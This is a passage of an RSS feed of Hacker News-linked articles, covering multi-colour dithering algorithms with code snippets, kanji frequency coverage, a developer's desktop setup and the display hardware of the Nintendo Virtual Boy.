excited that it‚Äôs finally out, and to see what people create with it. Personally I‚Äôd like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It‚Äôs spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk ‚Äî The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond ‚Äúmonochrome‚Äù. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I‚Äôd like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma‚Äôs post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don‚Äôt feel the need to explain these again, but merely add on what I‚Äôve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
‚Äúmodify these nearby pixels‚Äù, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel‚Äôs colour value.</li>
  <li>Find the colour in the palette that is ‚Äúclosest‚Äù to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma‚Äôs post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently ‚Äì for example adding 5 to each colour won‚Äôt affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don‚Äôt have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we‚Äôre not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn‚Äôt match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the ‚Äúradiant power‚Äù of the original
pixel colours, while restricted to a certain set of ‚Äúemitters‚Äù, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it‚Äôs more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that‚Äôs worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) ‚Äì&gt; 2 round( 2.7 ) ‚Äì&gt; 3<br>
round( 1.5 ) ‚Äì&gt; 2 round( 2.5 ) ‚Äì&gt; 2<br>
round( 1.3 ) ‚Äì&gt; 1 round( 2.3 ) ‚Äì&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won‚Äôt
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you‚Äôll want the random ranges to be the same for R, G, and B.</p>

<p>Here‚Äôs an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a ‚Äúthreshold matrix‚Äù. ‚ÄúThresholding‚Äù is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it‚Äôs less than the matrix value, make
it black, otherwise white. Obviously this doesn‚Äôt work with any other kind of palette. So what‚Äôs the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there‚Äôs no citation,
but I‚Äôve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>√ó</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>√ó</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>‚àí</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It‚Äôs the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you‚Äôll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast ‚Äì
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‚àí</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel‚Äôs colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that‚Äôs essentially the purpose of this ‚Äì converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>‚àí</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you‚Äôre using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you‚Äôll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you‚Äôve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you‚Äôre using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn‚Äôt make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it‚Äôs not the greatest. Here‚Äôs an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn‚Äôt really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Screenshots from Developers: 2002 vs. 2015]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26119769">thread link</a>) | @beliu
<br/>
February 12, 2021 | https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/ | <a href="https://web.archive.org/web/*/https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>How things have (and have not changed). I'm still a command-line junkie with at least two xterm windows open. I'm still using a 3x3 virtual desktop. However, instead of fvwm, it is now LXDE. I've also switched from FreeBSD to Linux and I'm running Lubuntu as my distribution.</p>

<p>There are a lot of indispensable GUI tools that I use. These include Firefox, lyx, Gimp, KeepassX, Shutter, viking, dia, Wireshark, calibre, audacity, Handbrake and VLC. But where possible I still prefer to script things. My main development languages are still shell, Perl and C.</p>

<p>My shell is now bash. The vi keystrokes are burned into my fingertips and, as long as vim can be ported to new systems, that will be my text editor until I pass on. My mail client is now mutt (definitely not a web client) and my mail is stored locally, not on someone else's server.</p>

<p>The only issue I have is that, since a job change, I now have to deal with Windoze things. Thus, I have VirtualBox, libreoffice and Wine to help me do that.</p>

<p>I started with Unix on a Pyramid 90x. I now have a smart phone that blows the 90x out of the water on performance, RAM and storage. But I'm so very happy that, somewhere down underneath, there is still a Bourne shell and an operating system that does open(), close(), read(), write(), fork() and exec()!</p>
</div></div>]]>
            </description>
            <link>https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119769</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calvin and Hobbes Search Engine]]>
            </title>
            <description>
<![CDATA[
Score 450 | Comments 156 (<a href="https://news.ycombinator.com/item?id=26119380">thread link</a>) | @bookofjoe
<br/>
February 12, 2021 | http://michaelyingling.com/random/calvin_and_hobbes/ | <a href="https://web.archive.org/web/*/http://michaelyingling.com/random/calvin_and_hobbes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://michaelyingling.com/random/calvin_and_hobbes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119380</guid>
            <pubDate>Fri, 12 Feb 2021 22:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtual Boy Architecture: A Practical Analysis]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26117584">thread link</a>) | @strangecasts
<br/>
February 12, 2021 | https://www.copetti.org/writings/consoles/virtual-boy/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/virtual-boy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><div><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul><div><div id="cover-motherboard"><figcaption>The mainboard<br>Not to be confused with the 'Servo board' which the mainboard connects to.<br>Virtual Sound Unit IC, 128 KB of DRAM and 64 KB of PSRAM are fitted on the back.</figcaption></div><div id="cover-diagram"><a href="https://www.copetti.org/images/consoles/virtualboy/diagram.png"><picture>
<img width="1185" height="1062" alt="Diagram" loading="auto" src="https://www.copetti.org/images/consoles/virtualboy/diagram.png"></picture></a><figcaption>Notice how the two screenshots have its background scenery slightly shifted horizontally</figcaption></div></div></div><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>A console often summarised by its short lifespan and limited colour space. While technically correct, I believe these attributes tend to overlook other surprising properties.</p><p>In this article, I invite readers to learn more about its internal features, many of which became predominant in the market only after the Virtual Boy‚Äôs discontinuation.</p><hr><h2 id="display">Display</h2><p>The whole system is a curious piece of engineering. Externally, it resembles a bulky VR headset on a bipod. The player must place their head close to the eyepiece to see the game in action.</p><div><a href="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png"><picture>
<img name="image_cover" alt="Image" width="1111" height="526" src="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png" loading="auto"></picture></a><figcaption>This is as far as I get trying to shoot a photo of the display and the case at the same time. In reality, games look very crisp and in full size!</figcaption></div><p>Internally, it‚Äôs a whole different story (and a very complicated one too). For this reason, I thought it would be better to start by explaining how this console displays images and then go through the internal hardware.</p><h4 id="projecting-an-image">Projecting an image</h4><p>Once you switch the Virtual Boy on, you will start seeing two <strong>monochromatic red</strong> pictures (one for each eye) through the eyepiece. So far so good? Well, here is the interesting part: <strong>This console doesn‚Äôt have a screen</strong>, so what you see is more of an ‚Äòillusion‚Äô - Let‚Äôs dive deeper to know what‚Äôs going on.</p><p>The topics involved in explaining this (optics, visual phenomenons, etc) may feel difficult at first, but I constructed some interactive animations to make this section little more immersive.</p><div><ul><li id="tab-2-1-scanner-link"><a href="#tab-2-1-scanner">Scanner</a></li><li id="tab-2-2-mechanics-link"><a href="#tab-2-2-mechanics">Mechanics</a></li><li id="tab-2-3-display-link"><a href="#tab-2-3-display">Display</a></li><li id="tab-2-4-active-periods-link"><a href="#tab-2-4-active-periods">Active periods</a></li></ul><div><div id="tab-2-1-scanner"><h4>Scanner</h4><p>The large volume of this console can be attributed to the <strong>Scanner</strong>, which fills up a big part of it. The Scanner is the area of the Virtual Boy that displays images. It‚Äôs composed of two <strong>Display units</strong>, each one independently projects a frame (giving a total of two frames, one per eye).</p><p>A Display unit is where all the ‚Äòmagic‚Äô happens, it‚Äôs made of the following components:</p><ul><li>An <strong>LED Unit</strong>: Contains 224 red LEDs stacked vertically and the necessary circuitry to control each one of them.</li><li>A <strong>Lens</strong>: Refracts the light coming from the LEDs.<ul><li>At the top of the Virtual Boy‚Äôs case, there is a <strong>Focus slider</strong> used to shift the lenses closer or further away from the LEDs. This allows the user to adapt the console to their focal length (preventing blurry images).</li></ul></li><li>A <strong>Mirror</strong>: Reflects the light coming from the lens and directs them to the user‚Äôs eyes. Furthermore, this component will be constantly oscillating thanks to a <strong>Voice coil motor</strong> connected to it. The motor is managed by the <strong>Servo control</strong>, a separate board which sends electrical pulses at 50 Hz.<ul><li>All in all, this is a very complex and fragile area of the console, so there‚Äôs a photo interrupter (a type of photosensor) installed. This reports the oscillation observed from the mirror to the Servo control, which in turns monitors the oscillations and applies the necessary corrections.</li></ul></li></ul><p>Next to the focus slider there is a <strong>IPD dial</strong> (knob-shaped switch), which adjust the distance between the two Display units. This is done to adapt the displays to the user‚Äôs inter-pupil distance.</p></div><div id="tab-2-2-mechanics"><h4>Mechanics</h4><div><figcaption>Basic representation of the angle of the oscillating mirror over time (at a very slow motion)<br>The left and right LEDs are operating (active) during the red and blue period, respectively<br>During the grey period, no LED is operating (idle)<br>For sake of simplicity, the angular velocity represented here is constant (but not in the real world)</figcaption></div><p>Now that we have each component identified, let‚Äôs take a look how the Virtual Boy manages to show images to our eyes.</p><p>If you haven‚Äôt noticed before, there <strong>isn‚Äôt any dot-matrix display to be found</strong>, so why are we seeing two-dimensional images from the eyepiece? Similarly to the functioning of a CRT monitor, Display units play with the way we perceive images:</p><ul><li>The fact the mirrors oscillate enables a single column of LEDs to displace horizontally between our field of view. The angle of the mirror is strategically directed to place the LEDs on 384 different ‚Äòcolumn positions‚Äô distributed across our field of view.</li><li>Human vision is logarithmic and the mirror oscillates at <strong>50 Hz</strong> (each period takes 20 ms). This is so fast we end up perceiving 384 columns of LEDs illuminating at the same time (afterimage effect) until the mirror stops oscillating.</li><li>All of this is perfectly synchronised with the LED controller, which updates each LED bulb every time the mirror is slightly moved. Thus, we end up seeing a full picture coming from the eyepiece.</li></ul><p>In practice, there are some conditions for all these principles to work:</p><ul><li>The LEDs must only operate when the angular velocity of the mirror is stable (in other words, not when the mirror is changing direction). This can be thought of as the <a href="https://www.copetti.org/writings/consoles/master-system/#tab-2-4-result"><strong>Active State</strong></a> of a CRT monitor.</li><li>In relation to the previous point, the angular velocity of the mirror can‚Äôt stay constant (since the mirror can‚Äôt change direction instantly, the periods considered ‚Äòstable‚Äô will be subject to forces that will disrupt its velocity). To remedy this, the Virtual Boy stores a list of values in memory called <strong>Column Table</strong> which instructs how much time to dedicate for each column interval, in an effort to balance out excessive &amp; insufficient periods of ‚ÄòLED column‚Äô exposure.</li><li>Let‚Äôs not forget that this whole process has to be done twice since we got two display units (one per eye). Unfortunately, both units can‚Äôt pull energy and data at the same time, so each one operates at different display periods (out-of-phase, 10ms apart). We don‚Äôt notice this (another illusion!).</li></ul></div><div id="tab-2-3-display"><h4>Display</h4><div><figcaption>Simplified representation of how the first LED unit operates during specific periods of time. Notice how the LEDs will start displaying each column of the frame-buffer during active periods.</figcaption></div><p>Contrary to previous video chips modelled after CRT displays (i.e. <a href="https://www.copetti.org/writings/consoles/nes/#graphics">PPU</a> and <a href="https://www.copetti.org/writings/consoles/master-system/#graphics">VGP</a>), graphics on the Virtual Boy are <strong>not rendered on-the-fly</strong>. The graphics chip on this console sends the processed frame to a frame-buffer in memory, each column of the frame is then sent to the LED array for display.</p><p>Once the Servo board detects it‚Äôs time for display, the graphics chip will start sending columns of pixels from the frame-buffer to those 224 vertically-stacked LEDs, one-by-one in a strategically synchronised matter so the LEDs will have shown 384 columns during the display period. Hence, the ‚Äòscreen resolution‚Äô of this console is 384x224 pixels.</p><p>Moreover, we need to store two frame-buffers since each one will go to a different display unit. The graphics subsystem also employs double-buffering and other quirks (mentioned later in the ‚ÄòGraphics‚Äô section). So, for now, just remember how a digital frame is sent to the LEDs.</p></div><div id="tab-2-4-active-periods"><h4>Active periods</h4><div><figcaption>Another simplified animation, this time showing how the oscillation of the mirror deviates the LEDs light in a way the user will end up seeing a proper frame</figcaption></div><p>Consequently of this design, there are going to be periods of:</p><ul><li><strong>Active Display</strong> during which the LEDs are pulling an image from the frame-buffer and nothing can disrupt it.</li><li><strong>Active Display 2</strong>: Same as before but now the other Display unit is operating.</li><li><strong>Drawing idle</strong>: A period where none of the LEDs are operating and the angular velocity of the mirror is unstable.</li></ul><p>This cycle is repeated 50 times per second (hence the 50 Hz refresh rate). That means that for every frame, the CPU and GPU would have around 10ms worth of time to update the picture that the user will see. In reality, Nintendo‚Äôs engineers implemented something more sophisticated. Again, I‚Äôll try to explain this with more depth in the ‚ÄòGraphics‚Äô section. But for now I hoped you got a good understanding of how the Virtual Boy cleverly managed to produce a picture with inexpensive hardware.</p></div></div></div><p>This has been a quick explanation of how optics can turn a single vertical line into a picture. If you own or have read about the Virtual Boy before, you may be wondering when the three-dimensional imagery takes place. I just want to make it clear that none of the previous explanation have a connection with that effect. I‚Äôm mentioning this because in the past I‚Äôve seen many places arguing that the oscillating mirrors are the cause of the ‚Äòdepth perception‚Äô, however, with all the information I‚Äôve gathered in this study, I don‚Äôt think that claim is accurate.</p><p>That being said, I think it‚Äôs time we discuss the 3D phenomenon‚Ä¶</p><h4 id="creating-a-third-dimensional-vision">Creating a third-dimensional vision</h4><p>During the marketing of the Virtual Boy, there was a lot of fanfare regarding the fact this console could project a ‚Äò3D world‚Äô. I‚Äôm not referring to images with 3D polygons stamped (like the other 5th gen. consoles), but the actual perception of depth.</p><p>In a nutshell, the Virtual Boy relies on <strong>Stereoscopic images</strong> to carry out that illusion. So this system wasn‚Äôt only capable of toying with our vision to project a full image, but it also did it in a way we would think certain drawings are closer/far away from others!</p><div><div><figcaption>Snapshot of the game seen from the different display units<br>Mario's Tennis (1995)</figcaption></div><p>The technique is very simple: Each of the two frames displayed (one on each eye) will have some elements slightly shifted horizontally, so when we try to see them with our two eyes, our brain will think they are nearer than others. This depends on the direction the elements are shifted.</p><p>Objects shifted towards the centre of your eyes (moved right on the left frame and moved left on the right frame) will appear closer, objects shifted away from the center of your eyes will appear further away. Finally, objects with no shifting will appear between the two other. This approach is called <strong>Stereoscopic parallax</strong>.</p></div><p>One of the drawbacks of stereoscopy is <strong>eyestrain</strong>. This was alleviated by the fact games provided an ‚Äòautomatic pause‚Äô system which reminded the user to take breaks every 30 min. Nintendo also wrote down various warning messages in their packaging and ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/virtual-boy/">https://www.copetti.org/writings/consoles/virtual-boy/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/virtual-boy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117584</guid>
            <pubDate>Fri, 12 Feb 2021 19:31:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Covid brought the future back]]>
            </title>
            <description>
<![CDATA[
